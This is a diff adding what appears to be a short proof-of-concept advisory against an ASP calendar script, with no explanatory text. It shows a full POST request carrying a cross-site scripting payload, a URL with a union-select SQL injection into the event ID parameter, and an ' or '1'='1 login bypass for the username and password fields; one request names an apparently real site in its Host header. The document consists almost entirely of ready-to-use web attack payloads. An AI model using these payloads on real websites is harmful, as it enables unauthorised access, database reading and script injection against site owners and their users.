@@ -1,0 +1,25 @@
+http://www.example.com/[script]/calendar.asp?Client=1&Lang=3&Search=1&DoAction=Calendar&View=Search
+
+POST /Calendar/calendar.asp?Client=1&Lang=3&Search=1&DoAction=Calendar&View=Search HTTP/1.1
+Host: www.southforkwatershed.org
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.0.4) Gecko/2008102920 Firefox 3.0.3
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://[website]/[script]/calendar.asp?Client=1&Lang=3&Search=1&DoAction=Calendar&View=Search
+Cookie: ASPSESSIONIDSABBQBTD=MMPLNBODFDNEKLCLBECLLJOC
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+SText=%3Cscript%3Ealert%28%27XSSed%27%29%3C%2Fscript%3E
+
+http://www.example.com/[script]/calendar.asp?DoAction=Calendar&Q_DATE=11/28/2008&View=Event&IDEvent=2824+union+select+1+from+msysobjects
+
+
+http://www.example.com/[script]/calendar.asp?DoAction=USER&Change=LOGINFORM
+
+username:' or '1'='1
+
+password:' or '1'='1
